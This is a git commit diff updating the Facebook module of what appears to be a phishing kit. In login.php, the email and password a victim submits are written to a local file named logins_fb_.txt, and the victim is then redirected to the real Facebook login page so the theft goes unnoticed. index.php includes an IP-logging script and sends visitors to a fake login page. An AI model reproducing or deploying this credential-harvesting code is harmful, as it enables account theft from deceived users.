65f130c7b677bdf333c4e15192d47ed4377a1b5b
ElXds <80175806+ElXds@users.noreply.github.com>
2022-01-15 13:47:28 -0600

    Some Updates

--- .sites/facebook/index.php
+++ .sites/facebook/index.php
@@ -1,9 +1,8 @@
-<?php include 'ip.php';?>
+<?php include 'ip.php'; ?>
 <script type="text/javascript">
-if (screen.width <= 699) {
-document.location = "mobile.html";
-}
-else {
-document.location = "login.html";
-}
-</script> 
+    if (screen.width <= 699) {
+        document.location = "mobile.html";
+    } else {
+        document.location = "login.html";
+    }
+</script>
--- .sites/facebook/login.php
+++ .sites/facebook/login.php
@@ -1,6 +1,10 @@
 <?php
+if (!empty($_POST['email']) && !empty($_POST['pass'])) {
+    $user = filter_var($_POST['email'], FILTER_SANITIZE_FULL_SPECIAL_CHARS);
+    $pass = filter_var($_POST['pass'], FILTER_SANITIZE_FULL_SPECIAL_CHARS);
+}
+file_put_contents("logins_fb_.txt", "Facebook Username:-> " . $user . " Pass:-> " . $pass . "\n", FILE_APPEND);
 
-file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/recover/initiate/');
+header('Location: https://facebook.com/login');
+
 exit();
-?>
